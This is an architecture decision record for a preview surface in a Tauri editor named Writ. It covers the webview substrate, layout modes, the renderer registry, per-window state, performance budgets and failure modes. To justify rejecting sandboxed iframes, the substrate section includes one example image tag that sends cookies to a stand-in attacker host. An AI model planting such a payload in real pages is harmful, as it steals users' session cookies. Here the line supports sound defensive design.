# ADR-009: Preview Surface — Content-Type Renderer Registry

**Status:** Accepted, lean re-scope 2026-05-26
**Date:** 2026-05-22

> **Lean re-scope (2026-05-26).** The preview exists to render Writ's own
> agent/LLM output and prompt results, offline, for readability — not as a
> safe renderer for hostile web HTML. Network egress is categorically off
> forever. The substrate, registry, layout system, per-window state model,
> and fallback stylesheet in this ADR stand. **Cut from this ADR's scope:**
> the detached preview window (and its keybind/IPC — preview renders in a
> split pane in the same window; `LayoutMode` drops `Detached`); the export
> modal (PDF/HTML export); and the standalone PDF, SVG-file, and image-file
> renderers (inline images/SVG inside HTML still render via the HTML renderer
> + `data:` URIs). Trust/CSP/pins move to a single fixed document CSP — see
> the ADR-011 supersede note. Workspace/relative-asset resolution is cut — see
> the ADR-010 supersede note. Markdown, Mermaid, and KaTeX remain core
> (agents emit them constantly).

## Context

Writ has had one view per buffer since day one: CodeMirror. Every supported
file type opens as source text, including `.html`, `.htm`, `.md`, and the
image extensions registered as file-associations in `tauri.conf.json`. There
is no rendered preview anywhere in the product.

The next user-visible capability — and the foundation for several after it
— is a **preview surface**: a second view of a buffer that interprets the
document's bytes according to its content type. HTML is the first renderer
to ship. Markdown is the second. Mermaid, LaTeX/math, PDF, SVG, and the
raster image set ship in the same epic, behind the same registry, on the
same substrate.

The decision in front of us is **the shape of the preview surface itself**:
the rendering substrate, the layout system that hosts it, the abstraction
that lets multiple content types share it, and the per-window state model
that makes a detachable preview viable without forking the codebase. Trust,
permissions, the `writ-preview://` CSP, the verification suite, and the
threat model are deferred to **ADR-011**. The workspace primitive and the
`writ-workspace://` sibling-file protocol are deferred to **ADR-010**.
This ADR is the load-bearing architecture decision the other two extend.

The wrong move is to ship a single-purpose HTML renderer wired straight
into the buffer tab and call it "preview." That forecloses on every other
content type, forces a rewrite when markdown lands, and bakes
single-window assumptions into a feature that explicitly needs a
detachable second window. The right move is to define the **surface, the
registry, and the per-window state model once**, with HTML as the first
renderer plugged in against them.

## Decision drivers

- **Safe-by-default.** The preview substrate must be a separate webview
  with its own CSP, not the main app webview. Default policy is no
  scripts, no network, no remote subresources, no iframes. The substrate
  decision is forced by this constraint; the policy itself is owned by
  ADR-011.
- **Multi-renderer from day one.** Seven content types ship in this epic
  (HTML, markdown, Mermaid, LaTeX/math, PDF, SVG, raster image). The
  registry must accept all seven without per-renderer special cases in
  the surface, the IPC, or the frontend.
- **Multi-layout from day one.** Three layouts ship: side-by-side split
  (default for authoring content like HTML and markdown), tab-swap
  (preview replaces source within one tab), and detachable window (a
  real second window that mirrors a buffer). A user setting picks the
  default; the user can switch at any time.
- **Per-window state from day one.** Writ's stores currently assume a
  single window. A detachable preview window is a second window with
  its own active buffer, layout, view mode, and policy state. Per-window
  state is therefore a precondition of the layout decision, not a
  follow-on refactor.
- **Loader-agnostic registry shape.** The same trait-object pattern used
  by `writ-plugin`'s `TextTransform` registry (ADR-006) is the precedent
  here. A future external renderer (a WASM module, a JS extension)
  registers as another `ContentRenderer` against the same registry. No
  call site learns that anything new arrived.
- **CodeMirror is not replaced.** The preview is a second view of the
  same buffer text. CodeMirror remains the source editor; the buffer
  store remains its authoritative source. Toggling between source and
  preview never tears down the CodeMirror state.
- **Theme-coherent.** When a document has no own stylesheet, Writ
  supplies a real typographic system that inherits app theme tokens
  (`--writ-font-sans`, theme background, theme foreground). When the
  document brings its own CSS, author styles win — Writ paints the
  chrome around the document, not the document itself.
- **Workspace boundaries hold.** This ADR adds no Tauri dependency to
  `writ-core`. The surface and registry types live in `writ-core`; the
  webview lifecycle, the protocol handler, and the registry singleton
  live in `src-tauri`. `writ-plugin` is untouched in v1 — first-party
  renderers are host code, not user plugins.

## Considered options

This ADR makes six composite decisions: **A** substrate, **B** layout,
**C** edit behavior, **D** registry shape, **E** per-window state model,
**F** fallback stylesheet. The substrate and the per-window model are
the load-bearing decisions; the others are scoped by them.

### A — Rendering substrate

#### A1. Per-buffer child Tauri webview with a custom protocol

Each preview pane is a `WebviewWindow` (detached layout) or a child
`Webview` mounted inside the main window (split and swap layouts).
Subresource requests go through a custom Tauri protocol handler
(`writ-preview://`). Per-webview CSP is set programmatically when the
webview is created. The handler decides which requests are answered and
which are blocked; under default policy the handler serves only the
document HTML, the bundled fallback stylesheet, and bundled trusted
chrome assets (Mermaid, KaTeX), and refuses everything else. Network
egress is impossible because `connect-src` is `'none'` and the protocol
handler does not forward requests.

- Pros: Writ owns the network boundary, not the renderer's `sandbox`
  attribute heuristics. The same substrate hosts every content type
  with one CSP configuration per policy state. Detachable windows are
  a single API call (`WebviewWindow::new`) instead of a JS popup.
  Per-platform behavior is controlled by Tauri rather than by the host
  page.
- Cons: More wiring than an iframe. A protocol handler must exist in
  Rust, and the per-webview CSP plumbing is non-trivial. Webview spawn
  has a non-zero cost; cold spawn is measured in this ADR's performance
  budget.

#### A2. Inline `<iframe sandbox srcdoc="…">` inside the main app webview

The preview pane is a Solid component that renders an `<iframe>` with
`sandbox` attributes and the document HTML as `srcdoc`. CSP is inherited
from the parent webview.

- Pros: No new Rust code. The whole preview surface ships in the
  frontend.
- Cons: The `sandbox` attribute blocks scripts and form submission;
  it does **not** block subresource fetches. `<img src="https://attacker/?cookie=…">`
  still goes out. Adding `csp` attribute support helps but is
  inconsistently implemented across the webview engines Tauri ships
  on (WebKit on macOS, WebKit2GTK on Linux, WebView2 on Windows).
  Detachable preview is not natively possible; the iframe cannot be
  reparented into a second window. **Rejected** — the security model
  Writ promises is unachievable here. This is not a hardening pass.

#### A3. Rust-side HTML parse + SolidJS structured render

Parse the HTML in Rust (`html5ever` or similar), serialize a tree of
allowed nodes to the frontend, render through Solid components into
the main webview's DOM under the existing CSP. No iframe, no second
webview, no protocol handler.

- Pros: No new substrate at all. Network exfiltration is structurally
  impossible because subresources are never realized — image `src` is
  inert until the frontend explicitly resolves it.
- Cons: View fidelity is not "rendered HTML." Author CSS does not
  apply unless we re-implement a CSS engine. SVG, PDF, image, and math
  are not addressable through this substrate without a separate
  rendering pipeline per content type. Markdown ends up shipping
  beautifully; HTML ends up shipping as "structured text." That fails
  the epic's "feels native to Writ" quality bar for HTML specifically,
  and forks the substrate per content type.

**Chosen: A1.** It is the only option where Writ controls the network
boundary, the only option where a detachable preview is structurally
clean, and the only option that hosts all seven content types under one
substrate. The protocol handler is the price; ADR-011 documents the
allowlist, the CSP per policy state, and the verification suite that
proves the boundary holds.

### B — Layout system

#### B1. Tab-swap only

The active tab toggles between source view and preview view. One pane,
one tab, one buffer. Cmd+W behavior is unchanged.

- Pros: Smallest surface. Matches Writ's current single-pane mental
  model. Singleton stores can stay as-is.
- Cons: Authoring HTML or markdown without side-by-side feedback is
  awkward. Detachable preview is not possible without a separate
  decision.

#### B2. Side-by-side split only

The active tab carries a vertical split. CodeMirror on the left, preview
on the right. A draggable handle persists the ratio per buffer. Tab-swap
is not offered.

- Pros: Best authoring ergonomics. Matches the markdown-editor norm.
- Cons: Read-only browsing of HTML files burns horizontal space on a
  pane the user does not edit. Detachable preview is still not possible
  without a separate decision.

#### B3. All three: split + tab-swap + detachable window, sharing one layout abstraction

`LayoutMode` is a first-class enum in `writ-core`:
`Source | Preview | Split { ratio: f32 } | Detached`. The active tab
carries a `LayoutMode`. A user setting picks the default per content
type; the user can switch with a keybind. `Detached` spawns a second
`WebviewWindow` that mirrors the buffer.

- Pros: Authoring users get split, focus users get swap, multi-monitor
  users get a detached preview window. The layout abstraction lives in
  one type and one set of components. Each layout mode is a render
  variant in a single `<TabContent>` component.
- Cons: Detachable preview forces multi-window state sync — see option
  E. This is the single hardest engineering item in the epic. The cost
  is real but is paid once.

**Chosen: B3.** Per the epic decision, all three ship in v1, sharing
one `LayoutMode` type and one set of components. `Split` is the default
for content types that combine authoring with preview (HTML, markdown).
`Preview` is the default for read-only viewing content types (PDF,
image, SVG). `Detached` is opt-in via keybind or context menu.

### C — Edit behavior

#### C1. Debounced live re-render

When source is edited, the preview re-renders after 200ms of keystroke
inactivity. Throttle ensures at most one re-render per 100ms of
continuous editing for very long sessions.

- Pros: Authoring feedback is the entire point of split-view preview.
  Live feedback under 250ms is the expected idiom for any markdown or
  HTML editor shipped in the last decade.
- Cons: Re-render cost scales with document size. A 5 MB document
  re-rendering every 200ms during typing is a frame budget catastrophe.

#### C2. Manual refresh only

Preview re-renders only when the user invokes a refresh command, or
when the file is saved.

- Pros: Lowest re-render cost. Useful for very large documents.
- Cons: Defeats the purpose of split-view preview for authoring work.
  Users will reach for another editor for markdown.

#### C3. Hybrid with size threshold

Debounced live re-render under a size threshold; auto-disable above
the threshold with a visible status indicator and a manual refresh
binding.

- Pros: Authoring feedback for documents in the size range where
  authoring actually happens. Cost ceiling for the pathological case.
- Cons: Adds a mode to the UX. Mitigated by the status indicator
  being a single discreet text token.

**Chosen: C1 with the C3 fallback.** Debounced 200ms live re-render is
the default. Above **1 MB document size** the surface auto-disables
live re-render, shows `manual refresh` in the status affordance, and
binds Cmd+R to refresh. Above **5 MB** the surface shows a "render
anyway?" confirm before any render at all. Above **50 MB** the surface
refuses to render and offers source-only view.

### D — Content-type registry shape

#### D1. `ContentRenderer` trait + `ContentRendererRegistry`

```rust
pub trait ContentRenderer: Send + Sync {
    fn content_type(&self) -> ContentTypeId;
    fn capabilities(&self) -> RendererCapabilities;
    fn render(&self, request: RenderRequest) -> Result<RenderOutput, RenderError>;
}

pub struct ContentRendererRegistry {
    renderers: HashMap<ContentTypeId, Box<dyn ContentRenderer>>,
}
```

Each first-party renderer (HTML, markdown, Mermaid, LaTeX, PDF, SVG,
image) is a unit struct implementing `ContentRenderer`. The host owns
the registry singleton and calls `register_builtin_renderers(&mut
registry)` at startup. A future external renderer adapter implements
the trait the same way.

- Pros: Identical surface for first-party and future external
  renderers. Mirrors ADR-006's load-bearing constraint exactly. The
  IPC, the frontend resolver, and the protocol handler are written
  once against the trait. Adding a renderer is one new struct in one
  module plus a registration line.
- Cons: Heap allocation per renderer (negligible — there are seven,
  not thousands). Virtual dispatch per render call (negligible — render
  runs at human cadence on bounded input).

#### D2. `enum PreviewKind { Html, Markdown, Mermaid, ... }`

Closed set of variants. The registry is a `match` block; rendering is
per-variant.

- Pros: No allocation, exhaustive matching.
- Cons: Closes the system. A WASM/JS external renderer cannot add a
  variant at runtime; the enum has to grow a `PreviewKind::External(...)`
  arm or be wrapped in an outer enum. Every match site breaks the day
  an external renderer ships. This is the same closed-vs-open trap
  ADR-006 rejected and is rejected here for the same reason.

#### D3. Per-component ad-hoc detection

Each tab component inspects the buffer extension and switches on it
inline.

- Cons: No abstraction at all. Six renderers' worth of branching
  pasted into the tab component. **Rejected** without further
  discussion; included for completeness because the epic mandated at
  least three options.

**Chosen: D1.** Direct precedent in ADR-006. The trait surface is
narrow, the future external loader is structurally identical to a
first-party renderer, and the registry is a single shared object the
preview surface, the IPC layer, and the protocol handler all reference.

### E — Per-window state model

This option exists only because B3 was chosen. Detachable preview = a
second `WebviewWindow` = a second frontend instance with its own
SolidJS root, its own stores, and its own active buffer.

#### E1. Keep singleton stores, add a window registry on top

Module-level signals remain. A `WindowRegistry` indexes them by
`WindowId` and selects the active set when each window's components
read state.

- Cons: Module-level signals are statically scoped per JS module, not
  per window. Two windows running the same code share one signal value.
  This option is structurally impossible in a SolidJS module-singleton
  architecture without a fork-and-rewire of every store. **Rejected.**

#### E2. Convert every store to per-window scoped via a `WindowProvider` context

Every singleton store (`buffers.ts`, `editor.ts`, `focus.ts`,
`save-status.ts`, `sidebar.ts`, `theme.ts`, `update.ts`,
`config.ts`) becomes a factory function called inside a
`<WindowProvider>` boundary. Components read state through a
`useWindow()` hook that returns the current window's store handles.

- Pros: Architecturally clean. Every piece of state is correctly
  scoped. No accidental cross-window leak.
- Cons: Touches every existing store, every component that reads a
  store, and every place a service is constructed. Roughly two weeks of
  refactor before any preview pixel renders.

#### E3. Hybrid: app-global state stays singleton; per-window state moves into `<WindowProvider>`

Some state is genuinely app-global: app config, theme, the update
checker, the file-watcher, the workspace registry (see ADR-010), the
content-renderer registry, the global hotkey state. These stay as
module-level singletons.

Other state is genuinely per-window: the active buffer focus, the
layout mode, the preview policy chip, the preview view mode, the tab
strip's selected tab, the sidebar's visibility. These move into a
`WindowState` factory returned by `createWindowState()` and provided
through a `<WindowProvider>` boundary.

The store layer becomes two-tier: `src/stores/global/` (singleton,
shared) and `src/stores/window/` (factory, scoped). Components read
window-scoped state via `useWindow()`; they read global state via
direct import as today. A pre-commit lint forbids cross-imports between
the two layers.

- Pros: Correctly models the actual scope of each piece of state.
  Refactor is bounded to the stores that are actually per-window
  (roughly five of the existing eight). Detachable window works
  natively because each `WindowProvider` instance has its own state
  tree.
- Cons: A new architectural pattern (`<WindowProvider>`) is introduced
  to the frontend. Documented in ADR-009; lint enforces the boundary.

**Chosen: E3.** It is the smallest refactor that makes B3 correct, and
it leaves global state in the place it actually belongs. The CLAUDE.md
single-window comments on existing singleton stores are amended in the
PRs that touch them; the surviving singletons keep the comment with the
clarifying rider that they are genuinely app-global, not per-window.

### F — Fallback stylesheet

When a document has no own stylesheet, Writ supplies a default. There
are three honest options.

#### F1. Minimal browser-default reset

Inherit theme background, set body font to `--writ-font-sans`, leave
everything else to browser defaults.

- Cons: Renders as a 1996 webpage. Fails the quality bar.

#### F2. Full typographic system, theme-aware (light + dark)

A real stylesheet with: heading hierarchy on a modular scale,
blockquote treatment, code blocks reusing CodeMirror highlight tokens
via CSS custom properties, `<pre>` styling, table rules with banded
rows, image figures with captions, lists with proper rhythm, links with
underline-on-hover and theme-aware accent color, responsive max-width
(72ch for prose), code-block horizontal scroll with theme-aware
scrollbar, theme-aware selection color, theme-aware
`prefers-reduced-motion` support for the source↔preview transition.
Two stylesheet variants, light and dark, picked from the app theme.

- Pros: Renders documents that look like a writer's tool, not a
  browser's debug view. Single source of truth for the look of
  "Writ-rendered HTML"; markdown reuses it; future renderers reuse it.
- Cons: A real stylesheet to maintain. Mitigated by colocating with
  the theme tokens and regression-testing against a fixture corpus.

#### F3. Pull in a third-party stylesheet (`marx`, `simple.css`, `new.css`)

- Rejected per user instruction (in-house ownership; no third-party
  recommendations for in-product polish).

**Chosen: F2.** The fallback stylesheet lives at
`src-tauri/assets/preview-base.css`, ships compiled into the binary,
and is served from `writ-preview://chrome/preview-base.css`. It is
applied only when the document has no `<style>` and no `<link
rel="stylesheet">` of its own; when the document brings its own CSS,
the fallback is **not** injected. This makes the "author styles win"
rule mechanical: the fallback is presence-conditional, not specificity-
contested.

## Decision (composite)

- **Substrate:** A1 — per-buffer child Tauri webview, `writ-preview://`
  custom protocol, per-webview CSP defaults. Full CSP table is owned
  by ADR-011; this ADR commits only that the substrate supports
  per-webview CSP and a trusted-vs-document scope split:
  `writ-preview://chrome/*` serves bundled trusted assets (fallback
  stylesheet, Mermaid runtime, KaTeX runtime, PDF.js runtime); 
  `writ-preview://document/*` serves the buffer content under the
  locked-down policy.
- **Layout:** B3 — `LayoutMode = Source | Preview | Split { ratio }
  | Detached { window_id }`. Default per content type:
  `Split` for HTML, Markdown;
  `Preview` for PDF, SVG, raster image;
  `Source` for any content type without a registered renderer.
  User can override globally in settings and per-buffer via keybind.
  Detach semantics are committed below in a dedicated section.
- **Edit behavior:** C1 with C3 fallback — debounced 200ms re-render
  under 1 MB; auto-disabled live re-render with manual Cmd+R above
  1 MB; render-anyway confirm above 5 MB; source-only above 50 MB.
- **Registry:** D1 — `ContentRenderer` trait, `ContentRendererRegistry`
  singleton, mirrors ADR-006 exactly.
- **Per-window state:** E3 — hybrid. Global state stays as singletons;
  per-window state moves into `<WindowProvider>` factories. Lint
  enforces the boundary.
- **Fallback stylesheet:** F2 — full typographic system, light + dark
  variants picked from theme, presence-conditional (not injected when
  the document has its own CSS).

## Keymap

The full preview-related keymap matrix. Every binding is registered
through the existing shortcut editor and is user-customizable.
Conflict-checked against the CodeMirror keymap and the existing app
shortcuts; no collision with `Shift+Shift` (palette), `Cmd+T`
(new tab), `Cmd+W` (close tab), `Cmd+[` / `Cmd+]` (switch tabs),
`Cmd+Shift+Space` (toggle window).

| Binding             | Action                                          | Scope              |
|---------------------|-------------------------------------------------|--------------------|
| `Cmd+Shift+V`       | Cycle layout: `Source` → `Split` → `Preview`    | Active tab         |
| `Cmd+R`             | Force re-render preview                         | When preview shown |
| `Cmd+Shift+R`       | Toggle preview-fullscreen (`Preview` mode)      | Active tab         |
| `Esc`               | Exit preview-fullscreen → return to `Split`     | When fullscreen    |
| `Cmd+Shift+O`       | Detach preview to a new window                  | Active tab         |
| `Cmd+Shift+\`       | Swap split orientation (vertical/horizontal)    | When in `Split`    |
| `Cmd+0`             | Reset split ratio to 50/50                      | When in `Split`    |

`Cmd+Shift+O` is also reused (with different scope) by ADR-010 to open
a folder as a workspace. Conflict resolved by context: when a tab is
active and the active content type has a registered renderer, the
binding detaches the preview; otherwise it opens the workspace picker.
This is the only context-sensitive binding in the keymap; documented
in the shortcut editor with a footnote.

`Cmd+R` does **not** override the OS browser-refresh default in the
main app webview because the main webview has no concept of refresh;
the binding fires only when a preview pane is mounted. macOS
paste-plain-text (`Cmd+Shift+V`) is intercepted in the source pane and
re-routed to the cycle-layout action; the CodeMirror keymap registers
the original paste-plain-text behavior under `Cmd+Shift+Alt+V` as a
fallback for users who want it.

## Detached-window semantics

`LayoutMode::Detached { window_id }` is the second-window case. It is
the most underspecified item in the layout system, so the rules are
committed here, not left to the implementation PR.

### State ownership on detach

When the user invokes detach from window A while viewing buffer X in
`Split` (or any layout with a preview pane):

1. A new `WebviewWindow` is spawned. Call it window B. Window B
   carries one tab: buffer X, layout `Preview` (preview-only — window
   B has no source pane).
2. Window A's tab for buffer X transitions from its prior layout to
   **`Source`**. The preview pane in window A is torn down (its
   pooled webview returns to the pool).
3. Window A's buffer X gains a `Detached` marker on its tab so the
   user can see that a detached preview exists. The marker is a
   single discreet glyph on the tab strip; clicking it focuses
   window B.
4. The buffer's prior layout (the layout window A had before detach)
   is stashed in per-window state under `previous_layout`. It is
   restored on re-attach.

### Re-attach

Re-attach happens automatically when window B closes (via `Cmd+W`,
the close button, OS quit, or any other route). Window A's tab for
buffer X transitions from `Source` back to its `previous_layout`,
and the `Detached` marker on the tab is cleared. The user is not
asked to confirm; the window-close gesture is the re-attach gesture.

Explicit re-attach without closing window B is also available via
`Cmd+Shift+O` from window B (the same binding that detached it from
window A, used in the opposite direction). Window B closes and
window A re-attaches in one step.

### Window lifecycle

- **`Cmd+W` in window A (main window):** closes the active tab in
  window A, per existing behavior. Does **not** close window B; any
  detached preview windows remain. Closing the last tab in window A
  closes window A, which triggers the OS app-quit path on platforms
  where that is the convention (macOS keeps the app alive; Linux and
  Windows quit). The OS app-quit path closes all windows including
  window B.
- **`Cmd+W` in window B (detached preview):** closes only window B.
  Window A re-attaches per the rule above.
- **`Cmd+Q` (macOS) / `Alt+F4` chain (Windows) / `Ctrl+Q` (Linux):**
  closes all windows including all detached preview windows. Standard
  app-quit behavior.
- **Window A closed while window B is open:** window B closes too.
  Detached previews are children of the main window for lifecycle
  purposes, even though they are independent OS windows for input.

### Persistence across app restart

Detached preview windows are **not** restored on app restart by
default. The user's session state stores the originating window's
buffer list and layout per buffer, but the detached marker is dropped
at quit. On next launch the buffer opens in its persisted non-detached
layout in the main window.

A future opt-in `[preview] detach_persist = true` in `WritConfig` can
re-spawn detached windows at startup; it is not part of this ADR's
commitments and is listed in the deferred questions.

### OS window-lifecycle semantics

The detached preview is an OS-level second window. Cross-platform
behavior matters and is committed here, not left to platform defaults.

- **App identity.** The detached window shares the main app's icon
  and identifier. On macOS, this means one Dock entry for Writ, with
  the detached window discoverable via the Window menu and via
  `Cmd+`` (cycle-windows-within-app). On Windows, one taskbar group;
  the detached window appears as a second thumbnail under that group.
  On Linux, one taskbar entry (DEs that group by `WM_CLASS` see both
  windows as Writ).
- **App-switching discoverability.** `Cmd+Tab` (macOS) /
  `Alt+Tab` (Windows/Linux) cycles between **applications**, not
  windows. Both Writ windows surface as one app. Switching to Writ
  from another app focuses the most recently focused Writ window
  (OS default). To cycle between Writ's own windows, the user uses
  `Cmd+`` on macOS, `Ctrl+Tab` on Windows/Linux (when focused in
  Writ), or the Window menu / app-menu's window list.
- **Window title.** The detached window's title is
  `<buffer-name> — Preview — Writ`. The main window's title is
  unchanged. This makes window-cycling overlays unambiguous about
  which window is which.
- **Window menu (macOS).** The Window menu lists both windows by
  title. Standard `Bring All to Front`, `Minimize`, `Zoom` items
  apply to whichever window is frontmost.
- **Detached window decorations.** The detached window uses the same
  custom-decoration setup as the main window (transparent,
  decorations: false, custom title bar) — visual parity is a quality
  bar, not just a default.

`tauri.conf.json` does not declare a second window statically;
detached windows are created at runtime via the Tauri API with
explicit per-window configuration that mirrors the main window's
configuration except for size (smaller default), position (offset
from main), and the URL path (`/preview-window` instead of `/`).

## Dev-tools posture on release builds

The default Tauri webview configuration enables dev-tools in debug
profiles and disables them in release. **The preview webview must
disable dev-tools in release explicitly**, separately from the main
webview's configuration. A user with dev-tools open in a release-
build preview webview could inspect host messages, replay IPC, or
manipulate the policy chip's DOM state outside the host's awareness.

The configuration is one line on the webview builder:

```rust
#[cfg(not(debug_assertions))]
builder = builder.devtools(false);
```

This applies to:

- The pooled warm preview webview at app boot.
- Every per-tab preview webview spawned thereafter.
- Detached preview window webviews.
- The chrome-scope and document-scope webviews if they are ever
  separated into distinct contexts in a future hardening pass.

In debug builds, dev-tools are enabled (the developer needs them to
inspect rendered output). The asymmetry is correct and documented;
the CSP and the protocol handler are the security boundary, not the
dev-tools toggle, but the toggle is a layer of defense-in-depth and
is set explicitly.

## Renderer roster (v1)

Each renderer ships in this epic, behind the same registry, on the
same substrate, with the same per-webview CSP scaffolding. Renderer-
specific architectural choices (which markdown engine, which math
renderer) get their own focused ADRs in the sequence as the
implementation phase reaches them; this ADR commits only to the
registry shape, the substrate, and the threat-surface notes per
renderer.

| Content type | Default layout | Sandbox notes (full detail in ADR-011)                          |
|--------------|----------------|------------------------------------------------------------------|
| HTML         | `Split`        | Document HTML served as-is. Author CSS allowed; author scripts and remote subresources default-deny. Inline `<script>` blocked by CSP. |
| Markdown     | `Split`        | Markdown parsed in Rust (engine choice → ADR-012). Output is HTML rendered under HTML's policy. Code blocks reuse CodeMirror highlight tokens. |
| Mermaid      | `Split`        | Mermaid runtime served from `writ-preview://chrome/mermaid/*` under a chrome-scoped CSP that permits `'self'` script. Document scripts remain blocked. Engine choice → ADR-013. |
| LaTeX/math   | `Split`        | KaTeX served from `writ-preview://chrome/katex/*` under chrome-scoped CSP. Math is rendered to spans, not images. Engine choice → ADR-014. |
| PDF          | `Preview`      | Either OS webview native PDF render (if available on all three platforms; verified per platform in CI) or PDF.js bundled at `writ-preview://chrome/pdfjs/*`. Engine choice → ADR-015. |
| SVG          | `Preview`      | Rendered natively by the webview as XML. `<script>` inside SVG is blocked by CSP (same `script-src 'none'` as HTML default policy). |
| Raster image | `Preview`      | PNG, JPG, WebP, GIF, AVIF served as binary by the protocol handler with correct MIME. Rendered via `<img>` in a minimal page; EXIF stripped on the protocol-handler side for tracking-pixel hygiene. |

The chrome vs. document CSP split is the substrate's load-bearing
security primitive. ADR-011 commits the full CSP per scope; this ADR
commits that the substrate **has** the split. Bundled trusted assets
never share an origin with user content; they are addressed by path
prefix within `writ-preview://` and the protocol handler refuses
cross-scope requests.

## Performance budgets

Asserted via integration tests, not aspirations. Tests run on the
project's standard CI matrix (macOS, Linux, Windows — per epic item
(e)). Failures gate merge.

### Per-platform cold-spawn asymmetry

A single cross-platform cold-spawn budget is wrong. The three webview
engines Tauri ships on have materially different process-init costs
on standard developer hardware:

- macOS WebKit: cold process init ≈ 150–250ms.
- Linux WebKit2GTK: cold process init ≈ 250–400ms.
- Windows WebView2: cold process init ≈ 500–1500ms (WebView2 runtime
  must be located, the broker process spun, and the renderer host
  attached).

A 300ms budget asserted across all three would fail Windows CI
constantly. The team would then be pushed to relax the assertion until
it passes, which defeats the assertion. The honest answer is per-
platform budgets plus a pre-warming strategy.

### Pre-warming

Writ spawns a "warm" preview webview at app boot, on the next idle
tick after the main window paints, configured against the locked-down
default policy and pointed at `writ-preview://chrome/blank`. The warm
webview is held in a `PreviewWebviewPool` of size 1 inside
`AppState`. When the user invokes a preview action:

1. If a pooled warm webview exists, it is reparented into the active
   tab's layout slot and re-pointed at the buffer's document URL. This
   is the "warm spawn" path.
2. The pool is replenished asynchronously, again on the next idle
   tick.
3. If the user triggers a second preview action before the pool
   refills, the second action takes the cold-spawn path.

The pool size of 1 is deliberate: a second pre-warmed webview is
memory the user is not paying back. Real-world friction is dominated
by the first preview action per session, not the second.

### Budgets (asserted in CI)

| Metric                                | macOS    | Linux    | Windows   |
|---------------------------------------|----------|----------|-----------|
| Preview spawn **warm** (from pool)    | < 80ms   | < 80ms   | < 120ms   |
| Preview spawn **cold** (pool empty)   | < 300ms  | < 400ms  | < 600ms   |
| Re-render 100 KB document             | < 80ms   | < 80ms   | < 120ms   |
| Layout transition (source settle)     | < 16ms   | < 16ms   | < 16ms    |
| Layout transition (preview settle)    | < 80ms   | < 80ms   | < 120ms   |
| Multi-window state sync (A → B)       | < 16ms   | < 16ms   | < 32ms    |

All numbers are p95 over the integration test's repeat-count, on the
GitHub Actions standard runner SKU for each platform. The Windows
budget reflects the WebView2 floor; if the warm-pool strategy is
working, users see the warm number in practice. If the pool ever
fails to populate (e.g., low memory), the cold number is the worst
case the user is exposed to.

### Memory ceiling — fixed per platform, plus regression check

A "+20% over historical baseline" rule would flake on CI hardware
drift. Replace with two checks:

1. **Fixed per-platform ceiling.** An idle preview webview process must
   not exceed: macOS 120 MB resident, Linux 140 MB resident, Windows
   180 MB working set. These are hard caps; a process exceeding them
   triggers a recycle (process closed; state preserved in the host).
2. **Per-PR regression check.** The CI integration test captures the
   memory number and compares it against the **previous merged
   commit's** number for the same test on the same platform. A jump of
   more than +10% over that specific baseline fails the PR. This is a
   delta check, not a historical-baseline check, so it survives CI
   hardware drift.

A preview that has not rendered for 30 seconds is paused; after 5
minutes of paused state it is recycled. The pool's warm webview is
exempt from these rules — it has not rendered any document by design.

## Failure modes

UX failure modes are owned here. Security failure modes (CSP violation,
policy-escape attempt, protocol-handler refusal) are owned by ADR-011.

- **Malformed HTML.** Webview parser is permissive; renders best-
  effort. A small status hint appears in the preview footer chrome:
  `parser recovered N warnings` (clickable; opens a non-modal panel
  with the warning list). The editor pane is unaffected.
- **Empty document.** Themed empty state in the preview pane:
  `no content` in the muted foreground color. No errors, no warnings.
- **Document over 1 MB.** Live re-render auto-disabled. Status
  affordance shows `large document — manual refresh`. Cmd+R triggers
  a render.
- **Document over 5 MB.** A non-modal banner inside the preview pane:
  `5.3 MB document — render anyway?` with `Render` and `Source only`
  actions. No render occurs until the user picks.
- **Document over 50 MB.** Preview surface refuses to render and shows
  `document too large — open in source view`. The Source layout is
  forced regardless of the buffer's default.
- **Renderer panic / unexpected error.** The error is caught at the
  IPC boundary and surfaced as an inline themed error card inside the
  preview pane:
  `unable to render — <short cause>`. The card has a `Retry` and a
  `Source only` action. The editor pane is unaffected. The error is
  logged to the existing logging layer.
- **Webview crash (OS-level).** Tauri's webview-window-event hook
  detects the destroy. Writ recycles the webview transparently; the
  preview pane shows a momentary `reloading preview…` state and
  re-renders. The buffer is never closed. Three crashes within 60
  seconds on the same buffer disable live re-render for that buffer
  and surface a `preview suspended — Cmd+R to retry` chip; the source
  view is unaffected. The per-buffer crash counter and its 60-second
  rolling window live in **per-window `preview-store`** (not global
  state): a detached preview window crashing repeatedly does not
  suspend live render in the main window's other tabs, and vice
  versa. The counter is reset on `Cmd+R` (manual retry), on layout
  change away from a preview-bearing mode, and on app restart.

## Print and export

The Tauri child webview exposes the OS print pipeline. Two surfaces
are added in this epic:

- **`Cmd+P` inside a preview pane** triggers the OS print dialog with
  the rendered document. macOS and Linux dialogs offer save-as-PDF;
  Windows offers print-to-PDF via the system PDF printer. The behavior
  is delegated to the OS; Writ ships no custom print UI.
- **`Cmd+Shift+E` (Export)** inside a preview pane opens a small modal:
  `Export → PDF | HTML (rendered) | HTML (source)`. PDF export uses
  the webview's print-to-file capability with margins from the
  fallback stylesheet's print media query. HTML (rendered) is the
  fully-resolved DOM serialized to disk; HTML (source) is just the
  buffer content. The export modal is the only modal added by this
  epic; it follows the existing confirm-dialog component pattern.

## Accessibility

Required in v1 (item d), enforced by the existing component-test
harness.

- **Keyboard navigation** through the rendered preview: `Tab` moves
  focus through links and form controls in the rendered document
  (even with scripts off, the document's static links and inputs are
  focusable). `Shift+Tab` reverse. `Esc` returns focus to the source
  pane.
- **Screen-reader landmarks.** The preview webview's chrome (the
  status affordance, the policy chip) declares `role="region"` with
  an accessible name. The rendered document carries its own
  landmarks; Writ does not inject ARIA attributes into user content.
- **Focus management on layout change.** Focus tracks the user
  intent: `Cmd+Shift+V` cycles layout and moves focus to the layout
  that has more screen real estate. `Cmd+Shift+R` (fullscreen preview)
  moves focus into the preview pane. `Esc` returns focus to the
  source pane.
- **`prefers-reduced-motion`.** The source↔preview transition is a
  120ms cross-fade by default; under `prefers-reduced-motion: reduce`
  it is a hard swap with no animation. The fallback stylesheet
  forwards the same media query to author CSS by leaving author
  motion preferences alone.
- **Color contrast.** The fallback stylesheet ships with computed
  contrast ratios; a CSS regression test asserts WCAG AA (4.5:1 body,
  3.0:1 large text) for every theme combination.

## Cross-platform parity

Required in v1 (item e). The preview surface ships on macOS, Linux,
and Windows. The CI matrix runs the full preview integration test
suite — including the security verification corpus (owned by ADR-011)
— on all three platforms. Tauri's child webview behavior differs per
platform (WebKit on macOS, WebKit2GTK on Linux, WebView2 on Windows);
the differences are mapped in `src-tauri/preview/platform.rs` with
